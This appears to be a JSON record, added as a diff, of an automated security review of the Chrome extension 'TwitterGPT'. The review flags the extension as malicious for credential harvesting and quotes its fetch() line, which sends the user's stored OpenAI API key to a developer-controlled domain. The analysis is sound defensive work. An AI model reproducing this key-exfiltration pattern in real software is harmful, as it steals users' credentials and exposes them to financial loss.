@@ -1,0 +1,73 @@
+{
+  "extension_id": "nafdjcnfmdcdnebjhehhohfaaffdlkon",
+  "extension_name": "TwitterGPT - Respond to tweets with ChatGPT",
+  "version": "1.3",
+  "user_count": 1000,
+  "dataset": "chatgpt",
+  "verdict": "MALICIOUS",
+  "confidence": 1.0,
+  "recommendation": "BLOCK",
+  "reasoning": "The extension is classified as MALICIOUS due to active credential harvesting. While it performs its stated function of generating tweet responses, it requires users to input their private OpenAI API key. Instead of communicating directly with OpenAI's official API (api.openai.com), the extension sends the user's secret key as a plaintext query parameter to a private server controlled by the developer (purplepanda.be). This practice allows the developer to collect and potentially misuse user API keys, which have direct financial value. There is no technical necessity to route secret API keys through a third-party proxy, and this behavior is not disclosed to the user.",
+  "full_validation": {
+    "extension_id": "nafdjcnfmdcdnebjhehhohfaaffdlkon",
+    "verdict": "MALICIOUS",
+    "confidence": 1.0,
+    "reasoning": "The extension is classified as MALICIOUS due to active credential harvesting. While it performs its stated function of generating tweet responses, it requires users to input their private OpenAI API key. Instead of communicating directly with OpenAI's official API (api.openai.com), the extension sends the user's secret key as a plaintext query parameter to a private server controlled by the developer (purplepanda.be). This practice allows the developer to collect and potentially misuse user API keys, which have direct financial value. There is no technical necessity to route secret API keys through a third-party proxy, and this behavior is not disclosed to the user.",
+    "recommendation": "BLOCK",
+    "key_concerns": [
+      "Exfiltration of private OpenAI API keys to an unauthorized third-party domain.",
+      "The use of GET requests to transmit secrets, which exposes the keys in server logs and browser history.",
+      "Lack of transparency regarding the man-in-the-middle architecture for AI requests."
+    ],
+    "evidence": {
+      "exfiltration_chain": {
+        "data_collected": "OpenAI API Key (user-provided credential)",
+        "processing_method": "The key is retrieved from local storage and appended as a plaintext query parameter to a GET request.",
+        "destination_domain": "functions.purplepanda.be",
+        "code_evidence": "fetch(\"https://functions.purplepanda.be/twittergpt/api/gpt-api-new.php?tweetContent=\" + encodeURI(tweetText) + \"&ws=\" + tweetStyle + \"&tweetID=\" + tweetID + \"&api-key=\" + userApiKey)"
+      },
+      "dual_purpose": {
+        "stated_purpose": "Respond to tweets with ChatGPT",
+        "hidden_functionality": "Credential harvesting of user OpenAI API keys via a third-party intermediary server.",
+        "code_evidence": "popup.js Line 116 and popup.old.js Line 83"
+      },
+      "credential_theft": {
+        "capture_mechanism": "Users are prompted to enter their 'API Key' into an input field (id='api-key-input') which is then stored in chrome.storage.local.",
+        "transmission_target": "https://functions.purplepanda.be/twittergpt/api/gpt-api-new.php",
+        "code_evidence": "chrome.storage.local.get([\"apiKey\"]).then((result) => { ... userApiKey = result.apiKey; ... });"
+      }
+    },
+    "domains": {
+      "legitimate": [
+        "twitter.com",
+        "clients2.google.com"
+      ],
+      "requires_investigation": [
+        "functions.purplepanda.be"
+      ],
+      "informational_only": []
+    },
+    "pattern_assessment": [
+      {
+        "pattern": "CREDENTIAL_STORAGE",
+        "usage": "MALICIOUS",
+        "justification": "While storing an API key is necessary for functionality, storing it specifically to facilitate exfiltration to a non-OpenAI domain is malicious."
+      },
+      {
+        "pattern": "FETCH",
+        "usage": "MALICIOUS",
+        "justification": "Used to send the user's private OpenAI API key to a third-party server (purplepanda.be) rather than the official OpenAI API endpoint."
+      },
+      {
+        "pattern": "INNERHTML",
+        "usage": "LEGITIMATE",
+        "justification": "Used to parse the tweet content from the Twitter DOM, which is consistent with the stated functionality."
+      }
+    ],
+    "token_usage": {
+      "prompt": 5951,
+      "candidates": 866,
+      "total": 8212
+    }
+  }
+}
